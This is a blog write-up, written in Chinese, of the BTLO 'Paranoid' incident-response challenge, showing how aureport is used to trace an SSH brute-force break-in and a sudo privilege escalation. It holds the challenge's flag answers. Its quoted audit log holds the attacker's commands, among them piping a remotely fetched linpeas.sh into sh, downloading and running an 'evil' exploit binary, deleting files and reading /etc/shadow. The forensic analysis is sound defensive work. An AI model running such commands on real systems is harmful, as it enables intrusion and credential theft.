<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  BTLO - Paranoid
  #

Challenge: https://blueteamlabs.online/home/challenge/paranoid-e5e164befb
:::spoiler TOC
[TOC]
:::
:::info
此lab大部分是參考1的說明，因為本身第一次接觸aureport，所以不太清楚指令或者是注意的地方
:::

  Tool
  #

AUReport: $ sudo apt install auditd
Linux CLI

  Background
  #

aureport --help
usage: aureport [options]
        -a,--avc                        Avc report
        -au,--auth                      Authentication report
        --comm                          Commands run report
        -c,--config                     Config change report
        -cr,--crypto                    Crypto report
        --debug                         Write malformed events that are skipped to stderr
        --eoe-timeout secs              End of Event Timeout
        -e,--event                      Event report
        --escape option                 Escape output
        -f,--file                       File name report
        --failed                        only failed events in report
        -h,--host                       Remote Host name report
        --help                          help
        -i,--interpret                  Interpretive mode
        -if,--input <Input File name>   use this file as input
        --input-logs                    Use the logs even if stdin is a pipe
        --integrity                     Integrity event report
        -k,--key                        Key report
        -l,--login                      Login report
        -m,--mods                       Modification to accounts report
        -ma,--mac                       Mandatory Access Control (MAC) report
        -n,--anomaly                    aNomaly report
        -nc,--no-config                 Don''t include config events
        --node <node name>              Only events from a specific node
        -p,--pid                        Pid report
        -r,--response                   Response to anomaly report
        -s,--syscall                    Syscall report
        --success                       only success events in report
        --summary                       sorted totals for main object in report
        -t,--log                        Log time range report
        -te,--end [end date] [end time] ending date & time for reports
        -tm,--terminal                  TerMinal name report
        -ts,--start [start date] [start time]   starting data & time for reports
        --tty                           Report about tty keystrokes
        -u,--user                       User name report
        -v,--version                    Version
        --virt                          Virtualization report
        -x,--executable                 eXecutable name report
        If no report is given, the summary report will be displayed
"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/btlo/incident-response/btlo---paranoid/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="BTLO - Paranoid"><meta property="og:description" content="BTLO - Paranoid # Challenge: https://blueteamlabs.online/home/challenge/paranoid-e5e164befb
:::spoiler TOC [TOC] ::: :::info 此lab大部分是參考1的說明，因為本身第一次接觸aureport，所以不太清楚指令或者是注意的地方 :::
Tool # AUReport: $ sudo apt install auditd Linux CLI
Background # aureport --help usage: aureport [options] -a,--avc Avc report -au,--auth Authentication report --comm Commands run report -c,--config Config change report -cr,--crypto Crypto report --debug Write malformed events that are skipped to stderr --eoe-timeout secs End of Event Timeout -e,--event Event report --escape option Escape output -f,--file File name report --failed only failed events in report -h,--host Remote Host name report --help help -i,--interpret Interpretive mode -if,--input <Input File name> use this file as input --input-logs Use the logs even if stdin is a pipe --integrity Integrity event report -k,--key Key report -l,--login Login report -m,--mods Modification to accounts report -ma,--mac Mandatory Access Control (MAC) report -n,--anomaly aNomaly report -nc,--no-config Don''t include config events --node <node name> Only events from a specific node -p,--pid Pid report -r,--response Response to anomaly report -s,--syscall Syscall report --success only success events in report --summary sorted totals for main object in report -t,--log Log time range report -te,--end [end date] [end time] ending date & time for reports -tm,--terminal TerMinal name report -ts,--start [start date] [start time] starting data & time for reports --tty Report about tty keystrokes -u,--user User name report -v,--version Version --virt Virtualization report -x,--executable eXecutable name report If no report is given, the summary report will be displayed"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="BTLO"><meta property="article:tag" content="Incident Response"><title>BTLO - Paranoid | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/btlo/incident-response/btlo---paranoid/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>BTLO - Paranoid</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#tool>Tool</a></li><li><a href=#background>Background</a></li><li><a href=#起手式>起手式</a></li><li><a href=#q1>==Q1==</a><ul><li><a href=#recon>Recon</a></li></ul></li><li><a href=#q2>==Q2==</a><ul><li><a href=#recon-1>Recon</a></li></ul></li><li><a href=#q3>==Q3==</a><ul><li><a href=#recon-2>Recon</a></li></ul></li><li><a href=#q4>==Q4==</a><ul><li><a href=#recon-3>Recon</a></li></ul></li><li><a href=#q5>==Q5==</a><ul><li><a href=#recon-4>Recon</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#q6>==Q6==</a><ul><li><a href=#recon-5>Recon</a></li></ul></li><li><a href=#q7>==Q7==</a><ul><li><a href=#recon-6>Recon</a></li></ul></li><li><a href=#q8>==Q8==</a><ul><li><a href=#recon-7>Recon</a></li></ul></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=btlo---paranoid>BTLO - Paranoid
<a class=anchor href=#btlo---paranoid>#</a></h1><p>Challenge: <a href=https://blueteamlabs.online/home/challenge/paranoid-e5e164befb>https://blueteamlabs.online/home/challenge/paranoid-e5e164befb</a></p><p>:::spoiler TOC
[TOC]
:::
:::info
此lab大部分是參考<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>的說明，因為本身第一次接觸aureport，所以不太清楚指令或者是注意的地方
:::</p><h2 id=tool>Tool
<a class=anchor href=#tool>#</a></h2><p>AUReport: <code>$ sudo apt install auditd</code>
Linux CLI</p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aureport --help
</span></span><span style=display:flex><span>usage: aureport <span style=color:#f92672>[</span>options<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>        -a,--avc                        Avc report
</span></span><span style=display:flex><span>        -au,--auth                      Authentication report
</span></span><span style=display:flex><span>        --comm                          Commands run report
</span></span><span style=display:flex><span>        -c,--config                     Config change report
</span></span><span style=display:flex><span>        -cr,--crypto                    Crypto report
</span></span><span style=display:flex><span>        --debug                         Write malformed events that are skipped to stderr
</span></span><span style=display:flex><span>        --eoe-timeout secs              End of Event Timeout
</span></span><span style=display:flex><span>        -e,--event                      Event report
</span></span><span style=display:flex><span>        --escape option                 Escape output
</span></span><span style=display:flex><span>        -f,--file                       File name report
</span></span><span style=display:flex><span>        --failed                        only failed events in report
</span></span><span style=display:flex><span>        -h,--host                       Remote Host name report
</span></span><span style=display:flex><span>        --help                          help
</span></span><span style=display:flex><span>        -i,--interpret                  Interpretive mode
</span></span><span style=display:flex><span>        -if,--input &lt;Input File name&gt;   use this file as input
</span></span><span style=display:flex><span>        --input-logs                    Use the logs even <span style=color:#66d9ef>if</span> stdin is a pipe
</span></span><span style=display:flex><span>        --integrity                     Integrity event report
</span></span><span style=display:flex><span>        -k,--key                        Key report
</span></span><span style=display:flex><span>        -l,--login                      Login report
</span></span><span style=display:flex><span>        -m,--mods                       Modification to accounts report
</span></span><span style=display:flex><span>        -ma,--mac                       Mandatory Access Control <span style=color:#f92672>(</span>MAC<span style=color:#f92672>)</span> report
</span></span><span style=display:flex><span>        -n,--anomaly                    aNomaly report
</span></span><span style=display:flex><span>        -nc,--no-config                 Don<span style=color:#e6db74>&#39;&#39;</span>t include config events
</span></span><span style=display:flex><span>        --node &lt;node name&gt;              Only events from a specific node
</span></span><span style=display:flex><span>        -p,--pid                        Pid report
</span></span><span style=display:flex><span>        -r,--response                   Response to anomaly report
</span></span><span style=display:flex><span>        -s,--syscall                    Syscall report
</span></span><span style=display:flex><span>        --success                       only success events in report
</span></span><span style=display:flex><span>        --summary                       sorted totals <span style=color:#66d9ef>for</span> main object in report
</span></span><span style=display:flex><span>        -t,--log                        Log time range report
</span></span><span style=display:flex><span>        -te,--end <span style=color:#f92672>[</span>end date<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>end time<span style=color:#f92672>]</span> ending date &amp; time <span style=color:#66d9ef>for</span> reports
</span></span><span style=display:flex><span>        -tm,--terminal                  TerMinal name report
</span></span><span style=display:flex><span>        -ts,--start <span style=color:#f92672>[</span>start date<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>start time<span style=color:#f92672>]</span>   starting data &amp; time <span style=color:#66d9ef>for</span> reports
</span></span><span style=display:flex><span>        --tty                           Report about tty keystrokes
</span></span><span style=display:flex><span>        -u,--user                       User name report
</span></span><span style=display:flex><span>        -v,--version                    Version
</span></span><span style=display:flex><span>        --virt                          Virtualization report
</span></span><span style=display:flex><span>        -x,--executable                 eXecutable name report
</span></span><span style=display:flex><span>        If no report is given, the summary report will be displayed
</span></span></code></pre></div><p><img src=https://hackmd.io/_uploads/B17xQgJOa.png alt=圖片></p><h2 id=起手式>起手式
<a class=anchor href=#%e8%b5%b7%e6%89%8b%e5%bc%8f>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo aureport --summary -if audit.log
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Summary Report
</span></span><span style=display:flex><span><span style=color:#f92672>======================</span>
</span></span><span style=display:flex><span>Range of time in logs: 10/05/21 08:22:07.664 - 10/05/21 08:28:06.610
</span></span><span style=display:flex><span>Selected time <span style=color:#66d9ef>for</span> report: 10/05/21 08:22:07 - 10/05/21 08:28:06.610
</span></span><span style=display:flex><span>Number of changes in configuration: <span style=color:#ae81ff>15</span>
</span></span><span style=display:flex><span>Number of changes to accounts, groups, or roles: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Number of logins: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Number of failed logins: <span style=color:#ae81ff>87</span>
</span></span><span style=display:flex><span>Number of authentications: <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>Number of failed authentications: <span style=color:#ae81ff>89</span>
</span></span><span style=display:flex><span>Number of users: <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>Number of terminals: <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span>Number of host names: <span style=color:#ae81ff>6</span>
</span></span><span style=display:flex><span>Number of executables: <span style=color:#ae81ff>115</span>
</span></span><span style=display:flex><span>Number of commands: <span style=color:#ae81ff>192</span>
</span></span><span style=display:flex><span>Number of files: <span style=color:#ae81ff>298</span>
</span></span><span style=display:flex><span>Number of AVC<span style=color:#960050;background-color:#1e0010>&#39;</span>s: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Number of MAC events: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Number of failed syscalls: <span style=color:#ae81ff>1606</span>
</span></span><span style=display:flex><span>Number of anomaly events: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Number of responses to anomaly events: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Number of crypto events: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Number of integrity events: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Number of virt events: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Number of keys: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Number of process IDs: <span style=color:#ae81ff>10679</span>
</span></span><span style=display:flex><span>Number of events: <span style=color:#ae81ff>16732</span>
</span></span></code></pre></div><h2 id=q1>==Q1==
<a class=anchor href=#q1>#</a></h2><blockquote><p>What account was compromised?</p></blockquote><h3 id=recon>Recon
<a class=anchor href=#recon>#</a></h3><p>既然是和帳號有關那就是和authentication有關，所以可以先用summary看他有多少user(結果如上)，再用<code>-au</code>指令看成功(失敗)的認證有多少</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo aureport -if audit.log -au
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Report
</span></span><span style=display:flex><span><span style=color:#f92672>============================================</span>
</span></span><span style=display:flex><span><span style=color:#75715e># date time acct host term exe success event</span>
</span></span><span style=display:flex><span><span style=color:#f92672>============================================</span>
</span></span><span style=display:flex><span>1. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no <span style=color:#ae81ff>465368</span>
</span></span><span style=display:flex><span>2. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no <span style=color:#ae81ff>465374</span>
</span></span><span style=display:flex><span>3. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no <span style=color:#ae81ff>465381</span>
</span></span><span style=display:flex><span>4. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no <span style=color:#ae81ff>465382</span>
</span></span><span style=display:flex><span>5. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no <span style=color:#ae81ff>465384</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>85. 10/05/21 08:22:55 btlo 192.168.4.155 ssh /usr/sbin/sshd yes <span style=color:#ae81ff>465936</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>89. 10/05/21 08:23:13 btlo 192.168.4.155 ssh /usr/sbin/sshd yes <span style=color:#ae81ff>467550</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>90. 10/05/21 08:23:34 btlo ? /dev/pts/1 /usr/bin/sudo yes <span style=color:#ae81ff>468442</span>
</span></span><span style=display:flex><span>91. 10/05/21 08:25:40 btlo ? /dev/pts/1 /usr/bin/sudo no <span style=color:#ae81ff>473858</span>
</span></span><span style=display:flex><span>92. 10/05/21 08:25:41 btlo ? /dev/pts/1 /usr/bin/sudo no <span style=color:#ae81ff>473860</span>
</span></span></code></pre></div><p>可以發現account name都是==btlo==，不過奇怪的是前面有一大堆的認證失敗，到最後才有三次的認證成功，所以我們可以很清楚的知道攻擊者就是==192.168.4.155==嘗試用==bruteforce==的方式透過ssh登入進來</p><p>:::spoiler Flag
Flag: <code>btlo</code>
:::</p><h2 id=q2>==Q2==
<a class=anchor href=#q2>#</a></h2><blockquote><p>What attack type was used to gain initial access?</p></blockquote><h3 id=recon-1>Recon
<a class=anchor href=#recon-1>#</a></h3><p>呈上題</p><p>:::spoiler Flag
Flag: <code>bruteforce</code>
:::</p><h2 id=q3>==Q3==
<a class=anchor href=#q3>#</a></h2><blockquote><p>What is the attacker&rsquo;s IP address?</p></blockquote><h3 id=recon-2>Recon
<a class=anchor href=#recon-2>#</a></h3><p>呈上題</p><p>:::spoiler Flag
Flag: <code>192.168.4.155</code>
:::</p><h2 id=q4>==Q4==
<a class=anchor href=#q4>#</a></h2><blockquote><p>What tool was used to perform system enumeration?</p></blockquote><h3 id=recon-3>Recon
<a class=anchor href=#recon-3>#</a></h3><p>根據<sup id=fnref1:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>的說明，此時要使用到<code>--tty</code>的參數列出登入進來之後下甚麼command</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo aureport -if audit.log --tty
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TTY Report
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================</span>
</span></span><span style=display:flex><span><span style=color:#75715e># date time event auid term sess comm data</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================</span>
</span></span><span style=display:flex><span>1. 10/05/21 08:23:16 <span style=color:#ae81ff>468403</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;hostname&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>2. 10/05/21 08:23:21 <span style=color:#ae81ff>468408</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;whoami&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>3. 10/05/21 08:23:26 <span style=color:#ae81ff>468414</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;ls&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>4. 10/05/21 08:23:27 <span style=color:#ae81ff>468419</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;sudo -l&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>5. 10/05/21 08:23:34 <span style=color:#ae81ff>468447</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh &lt;nl&gt;
</span></span><span style=display:flex><span>6. 10/05/21 08:23:37 <span style=color:#ae81ff>468450</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;wget -O - http://192.168.4.155:8000/linpeas.sh | sh&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>7. 10/05/21 08:26:21 <span style=color:#ae81ff>480914</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;lsb_release -a&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>8. 10/05/21 08:26:31 <span style=color:#ae81ff>480921</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;sudo -V&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>9. 10/05/21 08:26:36 <span style=color:#ae81ff>480934</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;wget http://192.168.4.155:8000/evil.tar.gz&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>10. 10/05/21 08:26:45 <span style=color:#ae81ff>480944</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;ls&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>11. 10/05/21 08:26:50 <span style=color:#ae81ff>480947</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;tar zxvf evil.tar.gz&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>12. 10/05/21 08:26:59 <span style=color:#ae81ff>480982</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;cd evil&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>13. 10/05/21 08:27:03 <span style=color:#ae81ff>480984</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;ls&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>14. 10/05/21 08:27:06 <span style=color:#ae81ff>480987</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;make&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>15. 10/05/21 08:27:10 <span style=color:#ae81ff>481020</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;./evil 0&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>16. 10/05/21 08:27:17 <span style=color:#ae81ff>481039</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;whoami&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>17. 10/05/21 08:27:21 <span style=color:#ae81ff>481050</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;rm -rf /home/btlo/evil&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>18. 10/05/21 08:27:39 <span style=color:#ae81ff>481059</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;rm  /home/btlo/evil.tar.gz&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>19. 10/05/21 08:27:45 <span style=color:#ae81ff>481062</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;cat /etc/shadow&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>20. 10/05/21 08:27:50 <span style=color:#ae81ff>481064</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;exit&#34;</span>,&lt;nl&gt;
</span></span><span style=display:flex><span>21. 10/05/21 08:27:53 <span style=color:#ae81ff>481065</span> <span style=color:#ae81ff>1001</span> pts1 <span style=color:#ae81ff>49</span> sh <span style=color:#e6db74>&#34;exit&#34;</span>,&lt;nl&gt;
</span></span></code></pre></div><p>從以上結果得知，攻擊者進來以後先recon一下(hostname / whoami / ls / sudo -l(查看目前的身分可以下甚麼command))，最重要的是他wget了一個linpeas.sh，這是一個專用於linux based的提權工具，詳細的資訊可以看<a href=https://cloud.tencent.com/developer/article/1841447>Linux權限提升研究: 自動化信息收集</a>，甚至後面下載了一個evil，應該是自己寫的或是自己蒐集的武器庫，提權完了之後就是要查看最重要的地方，也就是==/etc/shadow==，就是真實存密碼的地方</p><p>:::spoiler Flag
Flag: <code>linpeas</code>
:::</p><h2 id=q5>==Q5==
<a class=anchor href=#q5>#</a></h2><blockquote><p>What is the name of the binary and pid used to gain root?</p></blockquote><h3 id=recon-4>Recon
<a class=anchor href=#recon-4>#</a></h3><p>既然我們已經知道他下載了一個evil tar並且執行其中的script，那麼在process紀錄中一定有相關資訊，此時可以下<code>-p</code>列出所有process list，然後我們要著重在evil這個key word，所以記得grep</p><h3 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo aureport -if audit.log -p | grep <span style=color:#e6db74>&#34;evil&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># date time acct host term exe success event</span>
</span></span><span style=display:flex><span>16156. 10/05/21 08:27:17 <span style=color:#ae81ff>829992</span> /home/btlo/evil/evil <span style=color:#ae81ff>59</span> <span style=color:#ae81ff>1001</span> <span style=color:#ae81ff>481021</span>
</span></span></code></pre></div><p>:::spoiler Flag
Flag: <code>evil, 829992</code>
:::</p><h2 id=q6>==Q6==
<a class=anchor href=#q6>#</a></h2><blockquote><p>What CVE was exploited to gain root access? (Do your research!)</p></blockquote><h3 id=recon-5>Recon
<a class=anchor href=#recon-5>#</a></h3><p>只要上網找這一題的題目就會出現相關的CVE
<img src=https://hackmd.io/_uploads/HyiwqlydT.png alt=圖片></p><p>:::spoiler Flag
Flag: <code>CVE-2021-3156</code>
:::</p><h2 id=q7>==Q7==
<a class=anchor href=#q7>#</a></h2><blockquote><p>What type of vulnerability is this?</p></blockquote><h3 id=recon-6>Recon
<a class=anchor href=#recon-6>#</a></h3><p>呈上題，也可以看<a href=https://chat.openai.com/share/197d29c6-3298-45b2-b332-cd0f6e814a2f>chatgpt的回答</a></p><p>:::spoiler Flag
Flag: <code>heap_based buffer overflow</code>
:::</p><h2 id=q8>==Q8==
<a class=anchor href=#q8>#</a></h2><blockquote><p>What file was exfiltrated once root was gained?</p></blockquote><h3 id=recon-7>Recon
<a class=anchor href=#recon-7>#</a></h3><p>呈第4題</p><p>:::spoiler Flag
Flag: <code>/etc/shadow</code>
:::</p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://05t3.github.io/posts/Paranoid/>BTLO - Paranoid</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a>&#160;<a href=#fnref1:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#tool>Tool</a></li><li><a href=#background>Background</a></li><li><a href=#起手式>起手式</a></li><li><a href=#q1>==Q1==</a><ul><li><a href=#recon>Recon</a></li></ul></li><li><a href=#q2>==Q2==</a><ul><li><a href=#recon-1>Recon</a></li></ul></li><li><a href=#q3>==Q3==</a><ul><li><a href=#recon-2>Recon</a></li></ul></li><li><a href=#q4>==Q4==</a><ul><li><a href=#recon-3>Recon</a></li></ul></li><li><a href=#q5>==Q5==</a><ul><li><a href=#recon-4>Recon</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#q6>==Q6==</a><ul><li><a href=#recon-5>Recon</a></li></ul></li><li><a href=#q7>==Q7==</a><ul><li><a href=#recon-6>Recon</a></li></ul></li><li><a href=#q8>==Q8==</a><ul><li><a href=#recon-7>Recon</a></li></ul></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>